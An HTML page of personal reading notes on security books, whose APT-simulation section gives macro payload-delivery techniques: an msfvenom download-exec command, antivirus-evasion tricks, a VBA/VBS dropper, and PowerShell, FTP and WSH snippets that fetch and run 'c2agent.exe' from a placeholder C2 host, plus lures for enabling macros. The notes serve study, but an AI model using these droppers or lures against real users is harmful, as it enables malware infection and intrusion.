



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-4.2.0">
    
    
      
        <title>Books - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.750b69bd.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#buy" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              Books
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Books
      </label>
    
    <a href="./" title="Books" class="md-nav__link md-nav__link--active">
      Books
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#buy" title="Buy" class="md-nav__link">
    Buy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#done" title="Done" class="md-nav__link">
    Done
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in-progress" title="In progress" class="md-nav__link">
    In progress
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" title="Advanced Penetration Testing Hacking the World's Most Secure Networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a-bug-hunters-diary-stop-ch-4" title="A Bug Hunter's Diary (Stop: Ch-4)" class="md-nav__link">
    A Bug Hunter's Diary (Stop: Ch-4)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" title="Advanced Penetration Testing Hacking the World's Most Secure Networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#threat-modeling-designing-for-security" title="Threat Modeling Designing for Security" class="md-nav__link">
    Threat Modeling Designing for Security
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../code-review/" title="Code review" class="md-nav__link">
      Code review
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4" type="checkbox" id="nav-36-4">
    
    <label class="md-nav__link" for="nav-36-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-36-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9" type="checkbox" id="nav-36-4-9">
    
    <label class="md-nav__link" for="nav-36-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-36-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9-10" type="checkbox" id="nav-36-4-9-10">
    
    <label class="md-nav__link" for="nav-36-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-36-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-39" type="checkbox" id="nav-39">
    
    <label class="md-nav__link" for="nav-39">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-39">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/powershell/" title="Powershell" class="md-nav__link">
      Powershell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#buy" title="Buy" class="md-nav__link">
    Buy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#done" title="Done" class="md-nav__link">
    Done
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in-progress" title="In progress" class="md-nav__link">
    In progress
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" title="Advanced Penetration Testing Hacking the World's Most Secure Networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a-bug-hunters-diary-stop-ch-4" title="A Bug Hunter's Diary (Stop: Ch-4)" class="md-nav__link">
    A Bug Hunter's Diary (Stop: Ch-4)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" title="Advanced Penetration Testing Hacking the World's Most Secure Networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#threat-modeling-designing-for-security" title="Threat Modeling Designing for Security" class="md-nav__link">
    Threat Modeling Designing for Security
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Books</h1>
                
                <h2 id="buy">Buy<a class="headerlink" href="#buy" title="Permanent link">&para;</a></h2>
<ul>
<li>Art of Deception (Wiley, 2002)</li>
<li>Chris Hadnagy’s Social Engineering: The Art of Human Hacking (Wiley, 2010).</li>
</ul>
<h2 id="done">Done<a class="headerlink" href="#done" title="Permanent link">&para;</a></h2>
<ul>
<li>Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali</li>
</ul>
<h2 id="in-progress">In progress<a class="headerlink" href="#in-progress" title="Permanent link">&para;</a></h2>
<h3 id="advanced-penetration-testing-hacking-the-worlds-most-secure-networks">Advanced Penetration Testing Hacking the World's Most Secure Networks<a class="headerlink" href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" title="Permanent link">&para;</a></h3>
<ul>
<li>Take several case studies of <code>APT</code>s and walk the reader through how the attack was done.</li>
<li>The <code>Kane</code> incident <ul>
<li><a href="http://www.securityfocus.com/news/122">http://www.securityfocus.com/news/122</a></li>
<li><code>BO2K Remote Access Trojans</code> by <code>Cult of the Dead Cow</code> was left to be discovered. <code>Washington University's Medical Center</code> believed that the attack was prevented. </li>
</ul>
</li>
</ul>
<h3 id="a-bug-hunters-diary-stop-ch-4">A Bug Hunter's Diary (Stop: Ch-4)<a class="headerlink" href="#a-bug-hunters-diary-stop-ch-4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="http://www.trapkit.de/books/bhd/en.html">http://www.trapkit.de/books/bhd/en.html</a></li>
<li>Thought process in finding a VLC buffer overflow (TiVo media file)<ul>
<li>See Dick Grune and Ceriel J.H. Jacobs, Parsing Techniques: A Practical Guide, 2<sup>nd</sup> ed. (New York: Springer Science+Business Media, 2008), 1.</li>
<li>Media samples: <a href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a></li>
<li>David Litchfield, “Variations in Exploit Methods Between Linux and Windows,” 2003<ul>
<li><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf</a></li>
<li><a href="https://www.youtube.com/watch?v=VM1PzvChNv8">https://www.youtube.com/watch?v=VM1PzvChNv8</a></li>
</ul>
</li>
</ul>
</li>
<li>Sun Solaris IOCTL related kernel vulnerability<ul>
<li>First use Null pointer dereference to crash the system<ul>
<li>EIP is set to 0 value and  since 0 is not a valid address, system crashes</li>
<li>However, if we map Zero page, it's possible to take control of EIP</li>
</ul>
</li>
<li>Then use Zero page to get control over EIP/RIP<ul>
<li>kernel and the user space of a process share the same zero page: “Attacking the Core: Kernel Exploiting Notes” by twiz &amp; sgrakkyu, which can be found at <a href="http://www.phrack.com/issues.html?issue=64&amp;id=6">http://www.phrack.com/issues.html?issue=64&amp;id=6</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1">Advanced Penetration Testing Hacking the World's Most Secure Networks<a class="headerlink" href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" title="Permanent link">&para;</a></h3>
<ul>
<li>APT<ul>
<li>Capable of developing their own tools</li>
<li>Very strong understanding of how modern intrusion detection and prevention systems</li>
<li>APT tests involve, whether directly or indirectly, human manipulation. </li>
<li>Steps<ul>
<li>Initial compromise<ul>
<li>Usually done with social engineering techniques</li>
<li>Casting a wide net to catch the low hanging fruit is not an acceptable way to model APTs</li>
</ul>
</li>
<li>Establish beachhead<ul>
<li>Ensure future access to compromised assets without needing a repeat initial intrusion</li>
<li>Command &amp; Control</li>
</ul>
</li>
<li>Escalate privileges</li>
<li>Internal reconnaissance</li>
<li>Network colonization</li>
<li>Persist</li>
<li>Complete mission<ul>
<li>Exfiltrate stolen data</li>
</ul>
</li>
</ul>
</li>
<li>Mights about signs:<ul>
<li>Increase in elevated log-ons late at night</li>
<li>Finding widespread backdoor Trojans</li>
<li>Unexpected information flows</li>
<li>Discovering unexpected data bundles</li>
<li>Detecting pass-the-hash hacking tools</li>
</ul>
</li>
</ul>
</li>
<li>THE “KANE” INCIDENT<ul>
<li>Kane was able to stay hidden in the Medical Center networks by allowing his victims to believe they had expelled him</li>
<li>Leaving easily discoverable BO2K Remote Access Trojans</li>
<li><a href="http://www.securityfocus.com/news/122">http://www.securityfocus.com/news/122</a></li>
</ul>
</li>
<li>Simulating Advanced Persistent Threat<ul>
<li>Payload Delivery <ul>
<li>Part 1: Learning How to Use the VBA Macro<ul>
<li>Microsoft Office (2010 onward) the default behavior of the application is to make no distinction between signed and unsigned code</li>
<li>How NOT to:<ul>
<li><code>msfvenom -p windows/download_exec -f vba -e shikata-ga-nai -i 5 -a x86 --platform Windows EXE=c:\temp\payload.exe URL=http://www.wherever.com</code></li>
<li>functions being imported from kernel32.dll<ul>
<li>create a process thread</li>
<li>allocate memory for the shellcode</li>
<li>move the shellcode into that memory</li>
</ul>
</li>
<li>lot of virus scanners won’t scan the declaration sec- tion, only the main body of code<ul>
<li>Instead of <code>Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zdz As Long, ByVal Tfnsv As Long, ByVal Kyfde As LongPtr, Spjyjr As Long, ByVal Pcxhytlle As Long, Coupxdxe As Long) As LongPtr</code></li>
<li>Declare <code>Private Declare PtrSafe Function CreateThread Lib "kernel32" Alias "CTAlias" (ByVal Zdz As Long, ByVal Tfnsv As Long, ByVal Kyfde As LongPtr, Spjyjr As Long, ByVal Pcxhytlle As Long, Coupxdxe As Long) As LongPtr</code></li>
<li>And use <code>CTAlias</code> in  body to bypass some AVs</li>
</ul>
</li>
<li>modern antivirus software is capable of passing compiled code (including shellcode) into a micro-virtual machine to test heuristically</li>
<li>Do not leave shellcode like structures open</li>
<li>Use of one auto-open subroutine is suspicious
  <div class="highlight"><pre><span></span><code>Sub Auto_Open
    Main block of code
End Sub
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Sub AutoOpen()
    Auto_Open
End Sub
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Sub Workbook_Open()
  Auto_Open
End Sub
</code></pre></div></li>
<li>native functions within VBA that allow an attacker to download and execute code from the Internet (these are detected)<ul>
<li>Shell</li>
<li>URLDownLoadToFile</li>
</ul>
</li>
</ul>
</li>
<li>Using a VBA/VBS Dual Stager<ul>
<li>VBA is only ever used within Office documents, VBS is a standalone scripting</li>
<li>innocent-looking VBA macro that will carry a VBS payload, write it to file, and execute it
  <div class="highlight"><pre><span></span><code>Sub WritePayload()
    Dim PayLoadFile As Integer
    Dim FilePath As String
FilePath = &quot;C:\temp\payload.vbs&quot; PayloadFile = FreeFile
Open FilePath For Output As TextFile Print #PayLoadFile, &quot;VBS Script Line 1&quot; Print #PayLoadFile, &quot; VBS Script Line 2&quot; Print #PayLoadFile, &quot; VBS Script Line 3&quot; Print #PayLoadFile, &quot; VBS Script Line 4&quot;
    Close PayloadFile
Shell &quot;wscript c:\temp\payload.vbs&quot; End Sub
</code></pre></div></li>
</ul>
</li>
<li>Code Obfuscation<ul>
<li>encode the lines of the payload as Base64 and decode them prior to writing them to the target file</li>
<li>XOR function</li>
</ul>
</li>
<li>Social engineering <ul>
<li>imply that information has been sent to them in error</li>
<li>it’s something they shouldn’t be seeing</li>
<li>Something that would give them an advantage in some way </li>
<li>Something that would put them at a disadvantage if they ignored it.   </li>
<li>Give the end user a compelling reason to enable macros.</li>
<li>Tailor the attack to the client</li>
<li><img alt="" src="../_assets/2020-08-14-23-30-20.png" /></li>
</ul>
</li>
<li>Powershell
  <div class="highlight"><pre><span></span><code>Sub powershell()
    &#39; Powershell Macro
    Dim PSResponse As String
    PSResponse = Shell(&quot;PowerShell (New-Object System.Net.WebClient). DownloadFile(&#39;http://ourc2server.com/download/c2agent.exe&#39;,&#39;agent. exe&#39;&quot;);Start-Process &#39;agent.exe&#39;&quot;, vbHide)
End Sub
</code></pre></div></li>
<li>FTP
  <div class="highlight"><pre><span></span><code>open ourc2server.com
binary
get /c2agent.exe
quit
</code></pre></div>
  <div class="highlight"><pre><span></span><code>cmd.exe /c <span class="s2">&quot;@echo open ourc2server.com&gt;script.txt&amp;@echo binary&gt;&gt;script.txt&amp; @echo get /c2agent.exe&gt;&gt;script.txt&amp;@echo quit&gt;&gt;script.txt&amp;@ftp -s:scrip t.txt -v -A&amp;@start c2agent.exe&quot;</span>
</code></pre></div></li>
<li>Windows Scripting Host (WSH)
  <div class="highlight"><pre><span></span><code>strFileURL = &quot;http://ourc2server/downloads/c2agent.exe&quot;
strHDLocation = &quot;agent.exe&quot;
Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)
objXMLHTTP.open &quot;GET&quot;, strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strHDLocation
    objADOStream.Close
